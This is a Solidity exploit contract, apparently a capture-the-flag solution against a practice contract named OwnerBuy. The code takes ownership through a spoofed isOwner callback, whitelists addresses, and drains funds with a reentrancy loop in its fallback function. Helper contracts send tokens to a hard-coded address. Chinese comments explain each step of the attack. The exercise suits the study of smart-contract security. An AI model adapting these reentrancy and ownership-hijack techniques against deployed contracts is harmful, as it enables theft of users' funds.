// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.5.0;

import "../../src/04.challenge/OwnerBuy.sol";

contract attacker {
    OwnerBuy public ownerbuy;
    bool public isReentrancy = false;
    bool public isCallIsOwner = false;

    function init() public{
        ownerbuy = new OwnerBuy();
    }

    function beforeAttack() public payable {
        // 成为owner
        ownerbuy.changestatus(address(this));
        ownerbuy.changeOwner();
        // 设置自己为白名单，否则无法获得超过100元
        ownerbuy.setWhite(address(this));
        // 设置ownerbuy为白名单，否则ownerbuy无法接收400元进行重入
        ownerbuy.setWhite(address(ownerbuy));
        // 修改_owner
        ownerbuy.transferOwnership(0x220866B1A2219f40e72f5c628B65D54268cA3A9D);
        // 攻击合约需要buy一次才能调用sell()
        ownerbuy.buy.value(1 wei)();

    }

    function Attack() public payable{
        // 用三个Helper合约转账给攻击合约
        // 攻击合约重入攻击
        ownerbuy.sell(200);
        // 再次成为owner来调用finish
        ownerbuy.changestatus(address(this));
        ownerbuy.changeOwner();
        ownerbuy.finish();
    }

    function isOwner(address _owner) public returns(bool){
        if(isCallIsOwner == false){
            isCallIsOwner = true;
            return false;
        }else{
            isCallIsOwner = false;
            return true;
        }
        
    }

    function() external payable{
        if(isReentrancy == false){
            isReentrancy = true;
            ownerbuy.sell(200);
        }
    }
}

contract Helper{
    IOwnerBuy ownerbuy;
    
    constructor(address _addr) public payable {
        ownerbuy = IOwnerBuy(_addr);
    }
    function buyAndTransfer() public payable {
        ownerbuy.buy.value(1 wei)();
        ownerbuy.transfer(address(0xDb99f8e70F96625BdffDC8932D4c755bAa0fFfFf),100);
    }
}

interface IOwnerBuy{
    function buy() external payable returns (bool);
    function sell(uint256) external returns (bool );
    function finish() external  returns (bool);
    function changeOwner() external;
    function changestatus(address) external;
    function transferOwnership(address) external;
    function transfer(address, uint256) external returns (bool);
    function unsetWhite(address) external  returns (bool);
}
